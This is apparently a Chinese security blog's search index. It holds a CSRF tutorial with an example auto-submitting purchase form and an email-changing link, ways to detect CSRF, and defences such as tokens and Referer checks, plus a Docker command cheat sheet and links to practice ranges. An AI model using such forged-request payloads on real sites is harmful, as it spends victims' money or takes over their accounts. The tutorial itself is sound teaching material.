<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSRF跨站请求伪造</title>
    <link href="/2023/10/17/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/10/17/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<p>CSRF(XSRF)</p><p>Cross-Site Request Forgery</p><p>跨站请求伪造</p><h2 id="一、CSRF分类"><a href="#一、CSRF分类" class="headerlink" title="一、CSRF分类"></a>一、CSRF分类</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CSRF</span><span class="hljs-params">(Cross-Site Request Forgery)</span></span>，跟XSS漏洞攻击一样，存在巨大的危害性。<br><br>你可以这么来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等<br></code></pre></td></tr></table></figure><h3 id="1-GET型："><a href="#1-GET型：" class="headerlink" title="1.GET型："></a>1.GET型：</h3><p>如果一个网站某个地方的功能，比如用户修改邮箱是通过GET请求进行修改的。如：&#x2F;user.php?id&#x3D;1&amp;email&#x3D;<a href="mailto:&#49;&#x32;&#51;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#x6f;&#x6d;">&#49;&#x32;&#51;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#x6f;&#x6d;</a> ，这个链接的意思是用户id&#x3D;1将邮箱修改为<a href="mailto:&#x31;&#x32;&#x33;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#109;">&#x31;&#x32;&#x33;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#109;</a>。当我们把这个链接修改为 &#x2F;user.php?id&#x3D;1&amp;email&#x3D;<a href="mailto:&#97;&#98;&#99;&#x40;&#49;&#54;&#51;&#46;&#99;&#111;&#x6d;">&#97;&#98;&#99;&#x40;&#49;&#54;&#51;&#46;&#99;&#111;&#x6d;</a> ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，当用户刚好在访问这个网站，他同时又点击了这个链接，那么悲剧发生了。这个用户的邮箱被修改为 <a href="mailto:&#97;&#98;&#99;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#111;&#x6d;">&#97;&#98;&#99;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#111;&#x6d;</a> 了</p><h3 id="2-POST型："><a href="#2-POST型：" class="headerlink" title="2.POST型："></a>2.POST型：</h3><p>在普通用户的眼中，点击网页-&gt;打开试看视频-&gt;购买视频是一个很正常的一个流程。可是在攻击者的眼中可以算正常，但又不正常的，当然不正常的情况下，是在开发者安全意识不足所造成的。攻击者在购买处抓到购买时候网站处理购买(扣除)用户余额的地址。比如：&#x2F;coures&#x2F;user&#x2F;handler&#x2F;25332&#x2F;buy.php 。通过提交表单，buy.php处理购买的信息，这里的25532为视频ID。那么攻击者现在构造一个链接，链接中包含以下内容</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;form action=/coures/user/handler/25332/buy method=POST&gt;<br>&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;xx&quot; /&gt;<br>&lt;/form&gt;<br>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; <br></code></pre></td></tr></table></figure><p>当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了id为25332的视频，从而导致受害者余额扣除</p><h2 id="二、CSRF攻击原理"><a href="#二、CSRF攻击原理" class="headerlink" title="二、CSRF攻击原理"></a>二、CSRF攻击原理</h2><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231017164203485.png" alt="image-20231017164203485"></p><ol><li>用户输入账号信息请求登录A网站</li><li>A网站验证用户信息，通过验证后返回给用户一个cookie</li><li>在未退出网站A之前，在同一浏览器中请求了hack构造的恶意网站B</li><li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li><li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了。</li></ol><h3 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h3><p>1、道：怎么确定一个接口地址有没有CSRF漏洞呢？</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">从第三方网站直接调用接口可以成功<br></code></pre></td></tr></table></figure><p>2、术：具体怎么操作？</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-number">1</span>）抓取一个正常请求的数据包，如果没有<span class="hljs-keyword">Referer</span>字段和token，那么极有可能存在CSRF漏洞<br><span class="hljs-number">2</span>）如果有<span class="hljs-keyword">Referer</span>字段，但是去掉<span class="hljs-keyword">Referer</span>字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。<br><span class="hljs-number">3</span>）利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等<br></code></pre></td></tr></table></figure><p>3、器：有没有工具可以使用？</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">BurpSuite Send To Enagement tools Generate CSRF PoC<br>CSRFTester<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/s0md3v/</span>Bolt<br>https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/product/</span>vss<br></code></pre></td></tr></table></figure><h2 id="三、CSRF攻击的防御"><a href="#三、CSRF攻击的防御" class="headerlink" title="三、CSRF攻击的防御"></a>三、CSRF攻击的防御</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1.</span>验证 HTTP Referer 字段<br><br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http:<span class="hljs-comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求</span><br><br><span class="hljs-number">2.</span>在请求地址中添加 <span class="hljs-built_in">token</span> 并验证(Anti-CSRF <span class="hljs-built_in">token</span>)<br><br>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 <span class="hljs-built_in">token</span>，并在服务器端建立一个拦截器来验证这个 <span class="hljs-built_in">token</span>，如果请求中没有 <span class="hljs-built_in">token</span> 或者 <span class="hljs-built_in">token</span> 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求<br><br><span class="hljs-number">3.</span>在 HTTP 头中自定义属性并验证<br><br>这种方法也是使用 <span class="hljs-built_in">token</span> 并进行验证，和上一种方法不同的是，这里并不是把 <span class="hljs-built_in">token</span> 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 <span class="hljs-built_in">token</span> 值放入其中。这样解决了上种方法在请求中加入 <span class="hljs-built_in">token</span> 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 <span class="hljs-built_in">token</span> 会透过 Referer 泄露到其他网站中去<br><br><span class="hljs-number">4.</span>二次验证<br><br>验证码<br>短信<br>扫码<br>人脸识别<br><br><span class="hljs-number">5.</span>浏览器的保护措施<br><br>Referrer Policy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker 常用命令</title>
    <link href="/2023/10/16/docker-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/10/16/docker-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>docker build –no-cache -t psiinon&#x2F;bodgeit -f Dockerfile .   #建立</p><p>docker run –rm -p 8080:8080 -i -t psiinon&#x2F;bodgeit   #启动</p><p>docker exec -it 8ccbeab8b341  &#x2F;bin&#x2F;bash   #进入容器执行下面两条命令</p><p>curl -s -L <a href="https://github.com/psiinon/bodgeit/releases/download/1.4.0/bodgeit.war">https://github.com/psiinon/bodgeit/releases/download/1.4.0/bodgeit.war</a> &gt;</p><p>mv bodgeit.war &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#info|version</span><br>docker info       <span class="hljs-comment">#显示docker的系统信息，包括镜像和容器的数量</span><br>docker version    <span class="hljs-comment">#显示docker的版本信息。</span><br><span class="hljs-comment">#帮助命令</span><br>docker 命令 --<span class="hljs-built_in">help</span> <span class="hljs-comment">#帮助命令</span><br><span class="hljs-comment">#镜像命令</span><br>docker images <span class="hljs-comment">#查看所有本地主机上的镜像 可以使用docker image ls代替</span><br>docker search <span class="hljs-comment">#搜索镜像</span><br>docker pull <span class="hljs-comment">#下载镜像 docker image pull</span><br>docker rmi <span class="hljs-comment">#删除镜像 docker image rm</span><br><span class="hljs-comment">#容器命令</span><br>docker run 镜像<span class="hljs-built_in">id</span> <span class="hljs-comment">#新建容器并启动</span><br>docker ps 列出所有运行的容器 docker container list<br>docker <span class="hljs-built_in">rm</span> 容器<span class="hljs-built_in">id</span> <span class="hljs-comment">#删除指定容器</span><br><span class="hljs-comment">#删除所有容器</span><br>docker <span class="hljs-built_in">rm</span> -f $(docker ps -aq)   <span class="hljs-comment">#删除所有的容器</span><br>docker ps -a -q|xargs docker <span class="hljs-built_in">rm</span>  <span class="hljs-comment">#删除所有的容器</span><br><span class="hljs-comment">#启动和停止容器</span><br>docker start 容器<span class="hljs-built_in">id</span><span class="hljs-comment">#启动容器</span><br>docker restart 容器<span class="hljs-built_in">id</span><span class="hljs-comment">#重启容器</span><br>docker stop 容器<span class="hljs-built_in">id</span><span class="hljs-comment">#停止当前正在运行的容器</span><br>docker <span class="hljs-built_in">kill</span> 容器<span class="hljs-built_in">id</span><span class="hljs-comment">#强制停止当前容器</span><br><span class="hljs-comment">#退出容器</span><br><span class="hljs-built_in">exit</span> <span class="hljs-comment">#容器直接退出</span><br>ctrl +P +Q  <span class="hljs-comment">#容器不停止退出 ---注意：这个很有用的操作</span><br><span class="hljs-comment">#其他常用命令</span><br>docker run -d 镜像名  <span class="hljs-comment">#后台启动命令</span><br>docker logs <span class="hljs-comment">#查看日志</span><br>docker top 容器<span class="hljs-built_in">id</span> <span class="hljs-comment">#查看容器中进程信息ps</span><br>docker inspect 容器<span class="hljs-built_in">id</span>  <span class="hljs-comment">#查看镜像的元数据</span><br>docker <span class="hljs-built_in">exec</span> <span class="hljs-comment">#进入当前容器后开启一个新的终端，可以在里面操作。（常用）</span><br>docker attach <span class="hljs-comment"># 进入容器正在执行的终端</span><br>docker <span class="hljs-built_in">cp</span> 容器<span class="hljs-built_in">id</span>:容器内路径  主机目的路径<span class="hljs-comment">#从容器内拷贝到主机上</span><br><br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker attach<span class="hljs-comment">#连接到正在运行中的容器</span><br>docker <span class="hljs-keyword">build</span><span class="hljs-comment">#使用 Dockerfile 创建镜像</span><br>docker <span class="hljs-keyword">builder</span><span class="hljs-comment">#管理builds</span><br>    docker <span class="hljs-keyword">builder </span>prune<span class="hljs-comment">#清除build缓存</span><br>docker checkpoint<span class="hljs-comment">#管理checkpoints</span><br>    docker checkpoint create<span class="hljs-comment">#从正在运行的容器创建检查点</span><br>    docker checkpoint ls<span class="hljs-comment">#列出容器的检查点</span><br>    docker checkpoint rm<span class="hljs-comment">#删除指定的检查点</span><br>docker commit<span class="hljs-comment">#从容器创建一个新的镜像</span><br>docker <span class="hljs-built_in">config</span><span class="hljs-comment">#管理Docker配置</span><br>    docker <span class="hljs-built_in">config</span> create<span class="hljs-comment">#创建配置文件</span><br>    docker <span class="hljs-built_in">config</span> <span class="hljs-keyword">inspect</span><span class="hljs-comment">#查看配置文件信息</span><br>    docker <span class="hljs-built_in">config</span> ls<span class="hljs-comment">#显示docker里已经保存得配置文件</span><br>    docker <span class="hljs-built_in">config</span> rm<span class="hljs-comment">#删除配置文件</span><br>docker container<span class="hljs-comment">#管理容器</span><br>    docker container prune<span class="hljs-comment">#删除所有已停止的容器</span><br>docker <span class="hljs-built_in">context</span><span class="hljs-comment">#管理contexts</span><br>    docker <span class="hljs-built_in">context</span> create<span class="hljs-comment">#创建一个上下文</span><br>    docker <span class="hljs-built_in">context</span> export<span class="hljs-comment">#将上下文导出到tar或kubecconfig文件中</span><br>    docker <span class="hljs-built_in">context</span> import<span class="hljs-comment">#从tar或zip文件导入上下文</span><br>    docker <span class="hljs-built_in">context</span> <span class="hljs-keyword">inspect</span><span class="hljs-comment">#在一个或多个上下文上显示详细信息</span><br>    docker <span class="hljs-built_in">context</span> ls<span class="hljs-comment">#列出上下文</span><br>    docker <span class="hljs-built_in">context</span> rm<span class="hljs-comment">#删除一个或多个上下文</span><br>    docker <span class="hljs-built_in">context</span> update<span class="hljs-comment">#更新</span><br>    docker <span class="hljs-built_in">context</span> use<span class="hljs-comment">#设置当前docker的上下文</span><br>docker cp<span class="hljs-comment">#用于容器与主机之间的数据拷贝</span><br>docker create<span class="hljs-comment">#创建一个新的容器但不启动它</span><br>docker <span class="hljs-keyword">diff</span><span class="hljs-comment">#检查容器里文件结构的更改</span><br>docker events<span class="hljs-comment">#从服务器获取实时事件</span><br>docker exec<span class="hljs-comment">#在运行的容器中执行命令</span><br>docker export<span class="hljs-comment">#将文件系统作为一个tar归档文件导出到STDOUT</span><br>docker history<span class="hljs-comment">#查看指定镜像的创建历史</span><br>docker image<span class="hljs-comment">#管理镜像</span><br>    docker image <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示一个或多个镜像的元数据</span><br>    docker image ls<span class="hljs-comment">#列出本地镜像</span><br>    docker image prune<span class="hljs-comment">#删除没有使用的镜像</span><br>    docker image rm<span class="hljs-comment">#删除一个或多个镜像</span><br>docker images<span class="hljs-comment">#列出本地镜像</span><br>docker import<span class="hljs-comment">#从归档文件中创建镜像</span><br>docker info<span class="hljs-comment">#显示 Docker 系统信息，包括镜像和容器数</span><br>docker <span class="hljs-keyword">inspect</span><span class="hljs-comment">#获取容器/镜像的元数据</span><br>docker kill<span class="hljs-comment">#杀掉一个运行中的容器</span><br>docker load<span class="hljs-comment">#导入使用 docker save 命令导出的镜像</span><br>docker login<span class="hljs-comment">#登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><br>docker logout<span class="hljs-comment">#登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><br>docker logs<span class="hljs-comment">#获取容器的日志</span><br>docker manifest<span class="hljs-comment">#管理manifest(实验，不应用于生产环境)</span><br>    docker manifest annotate<span class="hljs-comment">#向本地镜像清单添加附加信息</span><br>    docker manifest create<span class="hljs-comment">#创建用于注释和推入注册表的本地清单列表</span><br>    docker manifest <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示镜像清单或清单列表</span><br>    docker manifest push<span class="hljs-comment">#将清单列表推入仓库</span><br>    docker manifest rm<span class="hljs-comment">#从本地存储中删除一个或多个清单列表</span><br>docker network<span class="hljs-comment">#管理网络</span><br>    docker network connect<span class="hljs-comment">#将容器连接到网络</span><br>    docker network create<span class="hljs-comment">#创建一个网络</span><br>    docker network <span class="hljs-keyword">disconnect</span><span class="hljs-comment">#断开容器的网络</span><br>    docker network <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示一个或多个网络的元数据</span><br>    docker network ls<span class="hljs-comment">#列出网络</span><br>    docker network prune<span class="hljs-comment">#删除所有没有使用的网络</span><br>    docker network rm<span class="hljs-comment">#删除一个或多个网络</span><br>docker node<span class="hljs-comment">#管理集群(swarm)节点</span><br>    docker node demote<span class="hljs-comment">#从群集(swarm)管理器中降级一个或多个节点</span><br>    docker node <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示一个或多个节点的元数据</span><br>    docker node ls<span class="hljs-comment">#列出群集(swarm)中的节点</span><br>    docker node promote<span class="hljs-comment">#将一个或多个节点推入到群集管理器中</span><br>    docker node ps<span class="hljs-comment">#列出在一个或多个节点上运行的任务，默认为当前节点</span><br>    docker node rm<span class="hljs-comment">#从群集(swarm)删除一个或多个节点</span><br>    docker node update<span class="hljs-comment">#更新一个节点</span><br>docker <span class="hljs-keyword">pause</span><span class="hljs-comment">#暂停容器中所有的进程</span><br>docker plugin<span class="hljs-comment">#管理插件</span><br>    docker plugin create<span class="hljs-comment">#从rootfs和配置创建一个插件。插件数据目录必须包含config.json和rootfs目录。</span><br>    docker plugin <span class="hljs-keyword">disable</span><span class="hljs-comment">#禁用插件</span><br>    docker plugin enable<span class="hljs-comment">#启用插件</span><br>    docker plugin <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示一个或多个插件的元数据</span><br>    docker plugin <span class="hljs-keyword">install</span><span class="hljs-comment">#安装一个插件</span><br>    docker plugin ls<span class="hljs-comment">#列出所有插件</span><br>    docker plugin push<span class="hljs-comment">#将插件推送到注册表</span><br>    docker plugin rm<span class="hljs-comment">#删除一个或多个插件</span><br>    docker plugin set<span class="hljs-comment">#更改插件的设置</span><br>    docker plugin upgrade<span class="hljs-comment">#升级现有插件</span><br>docker port<span class="hljs-comment">#列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口</span><br>docker ps<span class="hljs-comment">#列出容器</span><br>docker pull<span class="hljs-comment">#从镜像仓库中拉取或者更新指定镜像</span><br>docker push<span class="hljs-comment">#将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</span><br>docker rename<span class="hljs-comment">#重命名容器</span><br>docker restart<span class="hljs-comment">#重启容器</span><br>docker rm<span class="hljs-comment">#删除一个或多个容器</span><br>docker rmi<span class="hljs-comment">#删除一个或多个镜像</span><br>docker run<span class="hljs-comment">#创建一个新的容器并运行一个命令</span><br>docker save<span class="hljs-comment">#将指定镜像保存成 tar 归档文件</span><br>docker search<span class="hljs-comment">#从Docker Hub查找镜像</span><br>docker secret<span class="hljs-comment">#管理Docker secrets</span><br>    docker secret create<span class="hljs-comment">#从文件或STDIN创建一个秘密作为内容</span><br>    docker secret <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示有关一个或多个秘密的详细信息</span><br>    docker secret ls<span class="hljs-comment">#列出秘密</span><br>    docker secret rm<span class="hljs-comment">#删除一个或多个秘密</span><br>docker service<span class="hljs-comment">#管理服务</span><br>    docker service create<span class="hljs-comment">#创建一个服务</span><br>    docker service <span class="hljs-keyword">inspect</span><span class="hljs-comment">#查看服务的元数据</span><br>    docker service logs<span class="hljs-comment">#获取服务的日志</span><br>    docker service ls<span class="hljs-comment">#列出服务</span><br>    docker service ps<span class="hljs-comment">#列出一个或多个服务的任务</span><br>    docker service rm<span class="hljs-comment">#删除一个或多个服务</span><br>    docker service rollback<span class="hljs-comment">#将更改恢复到服务的配置</span><br>    docker service <span class="hljs-keyword">scale</span><span class="hljs-comment">#缩放一个或多个复制服务</span><br>    docker service update<span class="hljs-comment">#更新服务</span><br>docker stack<span class="hljs-comment">#管理堆栈</span><br>    docker stack deploy<span class="hljs-comment">#部署新的堆栈或更新现有堆栈</span><br>    docker stack ls<span class="hljs-comment">#列出现有堆栈</span><br>    docker stack ps<span class="hljs-comment">#列出堆栈中的任务</span><br>    docker stack rm<span class="hljs-comment">#删除堆栈</span><br>    docker stack services<span class="hljs-comment">#列出堆栈中的服务</span><br>docker start<span class="hljs-comment">#启动一个或多个已经被停止的容器</span><br>docker stats<span class="hljs-comment">#显示容器的实时流资源使用统计信息</span><br>docker stop<span class="hljs-comment">#停止一个运行中的容器</span><br>docker <span class="hljs-keyword">swarm</span><span class="hljs-comment">#管理集群(Swarm)</span><br>    docker <span class="hljs-keyword">swarm </span>ca<span class="hljs-comment">#查看或旋转当前群集CA证书。此命令必须针对管理器节点</span><br>    docker <span class="hljs-keyword">swarm </span>init<span class="hljs-comment">#初始化一个群集(Swarm)</span><br>    docker <span class="hljs-keyword">swarm </span><span class="hljs-keyword">join</span><span class="hljs-comment">#加入群集作为节点和/或管理器</span><br>    docker <span class="hljs-keyword">swarm </span><span class="hljs-keyword">join-token</span><span class="hljs-comment">#管理加入令牌</span><br>    docker <span class="hljs-keyword">swarm </span>leave<span class="hljs-comment">#离开群集(Swarm)</span><br>    docker <span class="hljs-keyword">swarm </span>unlock<span class="hljs-comment">#解锁群集(Swarm)</span><br>    docker <span class="hljs-keyword">swarm </span>unlock-key<span class="hljs-comment">#管理解锁钥匙</span><br>    docker <span class="hljs-keyword">swarm </span>update<span class="hljs-comment">#更新群集(Swarm)</span><br>docker system<span class="hljs-comment">#管理Docker</span><br>    docker system df<span class="hljs-comment">#显示docker磁盘使用情况</span><br>    docker system events<span class="hljs-comment">#从服务器获取实时事件</span><br>    docker system info<span class="hljs-comment">#显示系统范围的信息</span><br>    docker system prune<span class="hljs-comment">#删除未使用的数据</span><br>docker tag<span class="hljs-comment">#标记本地镜像，将其归入某一仓库</span><br>docker top<span class="hljs-comment">#查看容器中运行的进程信息，支持 ps 命令参数</span><br>docker trust<span class="hljs-comment">#管理Docker镜像的信任</span><br>    docker trust <span class="hljs-keyword">inspect</span><span class="hljs-comment">#返回有关key和签名的低级信息</span><br>    docker trust key<span class="hljs-comment">#管理登入Docker镜像的keys</span><br>    docker trust key generate<span class="hljs-comment">#生成并加载签名密钥对</span><br>docker trust key load<span class="hljs-comment">#加载私钥文件以进行签名</span><br>    docker trust revoke<span class="hljs-comment">#删除对镜像的认证</span><br>    docker trust sign<span class="hljs-comment">#镜像签名</span><br>    docker trust signer<span class="hljs-comment">#管理可以登录Docker镜像的实体</span><br>    docker trust signer <span class="hljs-keyword">add</span><span class="hljs-comment">#新增一个签名者</span><br>docker trust signer remove<span class="hljs-comment">#删除一个签名者</span><br>docker unpause<span class="hljs-comment">#恢复容器中所有的进程</span><br>docker update<span class="hljs-comment">#更新一个或多个容器的配置</span><br>docker version<span class="hljs-comment">#显示 Docker 版本信息</span><br>docker volume<span class="hljs-comment">#管理volumes</span><br>    docker volume create<span class="hljs-comment">#创建一个卷</span><br>    docker volume <span class="hljs-keyword">inspect</span><span class="hljs-comment">#显示一个或多个卷的元数据</span><br>    docker volume ls<span class="hljs-comment">#列出卷</span><br>    docker volume prune<span class="hljs-comment">#删除所有未使用的卷</span><br>    docker volume rm<span class="hljs-comment">#删除一个或多个卷</span><br>docker <span class="hljs-keyword">wait</span><span class="hljs-comment">#阻塞运行直到容器停止，然后打印出它的退出代码</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞练习靶场</title>
    <link href="/2023/10/13/%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/"/>
    <url>/2023/10/13/%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a></p><p><a href="https://vulhub.org/">https://vulhub.org/</a></p><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞</title>
    <link href="/2023/10/11/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
